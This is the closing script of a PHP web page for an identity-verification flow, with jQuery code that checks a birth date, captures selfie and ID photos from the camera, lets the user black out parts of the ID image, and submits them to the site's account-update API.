            $('.instruction-link').on('click', showInstructionModal);

            function showBackendErrorModal(message, okButtonCallBack) {
                $('#backend-error-modal h5.text-danger').text(message);
                (new bootstrap.Modal(document.getElementById('backend-error-modal'))).show();
                if (okButtonCallBack && typeof okButtonCallBack == 'function') {
                    $('#backend-error-modal #btn-backend-error-modal').unbind().on('click', okButtonCallBack);
                }
            }

            function isLeapYear(year) {
                return (year % 4 === 0 && year % 100 !== 0) || year % 400 === 0;
            }

            function addLeadingZero(number) {
                return number < 10 ? '0' + number : number;
            }

            function isBirthDateValid() {
                var $yearInput = $('#birth-year');
                var $monthInput = $('#birth-month');
                var $dayInput = $('#birth-day');
                var year = parseInt($yearInput.val());
                var month = parseInt($monthInput.val());
                var day = parseInt($dayInput.val());
                var isValid = true;

                birthDate = year + '-' + addLeadingZero(month) + '-' + addLeadingZero(day);

                if (isNaN(year) || year < 1940 || year.toString().length !== 4) {
                    $yearInput.addClass('is-invalid');
                    isValid = false;
                } else {
                    $yearInput.removeClass('is-invalid');
                }

                if (isNaN(month) || month < 1 || month > 12) {
                    $monthInput.addClass('is-invalid');
                    isValid = false;
                } else {
                    $monthInput.removeClass('is-invalid');
                }

                if (isNaN(day) || day < 1 || day > 31) {
                    $dayInput.addClass('is-invalid');
                    isValid = false;
                } else {
                    var daysInMonth = [31, isLeapYear(year) ? 29 : 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
                    if (day > daysInMonth[month - 1]) {
                        $dayInput.addClass('is-invalid');
                        isValid = false;
                    } else {
                        $dayInput.removeClass('is-invalid');
                    }
                }

                return isValid;
            }

            function validateUserData(successCallback) {
                if (!idImageHashName) {
                    showBackendErrorModal('Please retake your selfie photo');
                    nextPage('page-photo-id');
                    return;
                }
                if (!selfieImageHashName) {
                    showBackendErrorModal('Please retake your ID photo');
                    nextPage('page-photo-id-uploaded');
                    return;
                }
                successCallback();
            }

            function nextPage(nextPageName, fn) {
                $($('.verification-container-page:not([style="display: none;"])')).fadeOut(function() {
                    $('.verification-container-page.' + nextPageName).fadeIn();
                    if (fn && typeof fn == 'function') fn();
                });
            }

            function showInstructionModal() {

                document.body.classList.remove('overflowAuto');
                document.body.classList.add('overflowHidden');

                (new bootstrap.Modal(document.getElementById('black-out-modal'))).show();

                let allModalShadow = document.querySelectorAll('.modal-backdrop.fade');

                $('.modal-backdrop.fade').removeClass('show')

                allModalShadow[allModalShadow.length - 1].classList.add('show')
            }

            $('#btn-black-out-modal').click(function() {
                $('.modal-backdrop.fade').removeClass('show')
                $('.modal-backdrop.fade').hide()
                document.body.classList.remove('overflowHidden');
                document.body.classList.add('overflowAuto');
            })

            function showSpinnerLoader() {
                $('.verification-container').addClass('blur');
                $('.spinner-loader-fader')
                    .css({
                        display: 'flex'
                    })
                    .hide()
                    .fadeIn();
            }

            function hideSpinnerLoader() {
                $('.verification-container').removeClass('blur');
                $('.spinner-loader-fader').fadeOut();
            }

            function showTopHeader() {
                $('#top-header').show();
                $('.verification-container').css({
                    'margin-top': '30px'
                });
            }

            function hideTopHeader() {
                $('#top-header').hide();
                $('.verification-container').css({
                    'margin-top': '0'
                });
            }

            function startVideoStream(videoContainer, backCamera = false) {
                var config = {
                    video: {
                        width: {
                            min: 800,
                            ideal: 1920,
                            max: 3840
                        },
                        height: {
                            min: 600,
                            ideal: 1080,
                            max: 2160
                        },
                        facingMode: backCamera ? {
                            exact: 'environment'
                        } : 'user',
                        aspectRatio: 1.333 // 4:3
                    },
                    audio: false
                };

                return navigator.mediaDevices.getUserMedia(config)
                    .then(function(stream) {
                        var video = document.querySelector(videoContainer);
                        globalStream = stream;
                        video.srcObject = stream;
                    });
            }

            function stopVideoStream(videoContainer) {
                $(videoContainer).removeAttr('src');
                globalStream.getTracks().forEach(function(track) {
                    track.stop();
                });
            }

            function convertbase64ToFile(base64) {
                return (fetch(base64)
                    .then(function(res) {
                        return res.arrayBuffer();
                    })
                    .then(function(buf) {
                        return new File([buf], 'image.jpg', {
                            type: 'image/jpeg'
                        });
                    })
                );
            }

            function saveCanvasToFileAndCapture(type) {
                return convertbase64ToFile(capture('canvas-' + type, 'video-' + type))
                    .then(function(file) {
                        stopVideoStream('#video-' + type);
                        return file;
                    });
            }

            function saveCanvasToFile(type) {
                return convertbase64ToFile(getBase64fromCanvas('canvas-' + type))
                    .then(function(file) {
                        return file;
                    });
            }

            function getBase64fromCanvas(canvasContainer) {
                var canvas = document.getElementById(canvasContainer);
                return canvas.toDataURL('image/jpeg');
            }

            function capture(canvasContainer, videoContainer) {
                canvas = document.getElementById(canvasContainer);
                context = canvas.getContext('2d');
                var video = document.getElementById(videoContainer);

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                var canvasRenderWidth = isIphoneDevice() ?
                    window.innerWidth - 20 :
                    video.videoWidth;
                var canvasRenderHeight = isIphoneDevice() ?
                    canvasRenderWidth * video.videoHeight / video.videoWidth :
                    video.videoHeight;

                canvas.width = canvasRenderWidth;
                canvas.height = canvasRenderHeight;

                context.drawImage(video, 0, 0, canvasRenderWidth, canvasRenderHeight);
                return canvas.toDataURL('image/jpeg');
            }

            function loadImageFromFileToCanvas(canvasContainer, file) {

                var canvas = document.getElementById(canvasContainer);
                var context = canvas.getContext('2d');
                var reader = new FileReader();
                var img = new Image();

                reader.readAsDataURL(file);
                reader.onload = function(e) {
                    if (e.target.readyState == FileReader.DONE) {
                        img.src = e.target.result;
                        img.onload = function() {
                            context.drawImage(img, 0, 0);
                        }
                    }
                }
            }

            function startRedactingCanvasImage(type) {
                canvas = document.getElementById('canvas-' + type);
                context = canvas.getContext('2d');

                pos = {
                    x: 0,
                    y: 0
                };

                $(canvas).on('mousemove', draw);
                $(canvas).on('mousedown', setPosition);
                $(canvas).on('mouseenter', setPosition);
                $(canvas).on('touchstart', setPosition);
                $(canvas).on('touchmove', function(e) {
                    if (mobileAndTabletCheck() && e.touches.length == 2) return;
                    e.preventDefault();
                    var touch = e.touches[0];
                    var mouseEvent = new MouseEvent('mousemove', {
                        clientX: touch.clientX,
                        clientY: touch.clientY
                    });
                    canvas.dispatchEvent(mouseEvent);
                });
            }

            function stopRedactingCanvasImage(type) {
                canvas = document.getElementById('canvas-' + type);

                $(canvas).off('mousemove', draw);
                $(canvas).off('mousedown', setPosition);
                $(canvas).off('mouseenter', setPosition);
                $(canvas).off('touchstart', setPosition);
                $(canvas).off('touchmove', draw);
            }

            function setPosition(e) {
                var rect = canvas.getBoundingClientRect(),
                    scaleX = canvas.width / rect.width,
                    scaleY = canvas.height / rect.height;
                pos.x = (e.clientX - rect.left) * scaleX;
                pos.y = (e.clientY - rect.top) * scaleY;
            }

            function draw(e) {
                if (!mobileAndTabletCheck() && e.buttons !== 1) return;

                context.beginPath();

                context.lineWidth = 10;
                context.lineCap = 'round';
                context.strokeStyle = 'black';

                context.moveTo(pos.x, pos.y);
                setPosition(e);
                context.lineTo(pos.x, pos.y);

                context.stroke();
            }

            function saveCanvasImage(type) {
                var canvas = document.getElementById('canvas-' + type);
                var context = canvas.getContext('2d');
                IdCanvasBackup = context.getImageData(0, 0, canvas.width, canvas.height);
            }

            function restoreCanvasImage(type) {
                var canvas = document.getElementById('canvas-' + type);
                var context = canvas.getContext('2d');
                context.putImageData(IdCanvasBackup, 0, 0);
            }

            function isIphoneDevice() {
                return navigator.userAgent.match(/iPad/i) || navigator.userAgent.match(/iPhone/i);
            }

            function uploadPhotoToImageProcessor(file, image_type, successCallback) {
                if (fileIdImage.size > 0) {
                    successCallback();
                } else {
                    alert("File size is null");
                }
            }

            function submitVerification() {
                var formData = new FormData();
                formData.append('account_access_token', "<?= $account_access_token ?>");
                formData.append('nid_front', idImageHashName);
                formData.append('selfie', selfieImageHashName);

                $.ajax({
                    type: 'POST',
                    url: "<?= API_URL . '/api/v1/accounts/update' ?>",
                    data: formData,
                    processData: false,
                    cache: false,
                    contentType: false,
                    success: function(response) {
                        console.log(response);
                        nextPage('page-photo-files-uploading-complete');

                        if (response.success == true) {
                            window.location.href = "<?= url("{$category}/verification-pending?token={$account_access_token}") ?>";
                        } else {
                            showBackendErrorModal(response.body);
                        }
                    },
                    error: function(error) {
                        console.log(error)
                        showBackendErrorModal('Error submitting photos: ', error);
                        console.warn(error);
                    },
                    complete: function() {}
                });
            }
        });
    </script>
</body>

</html>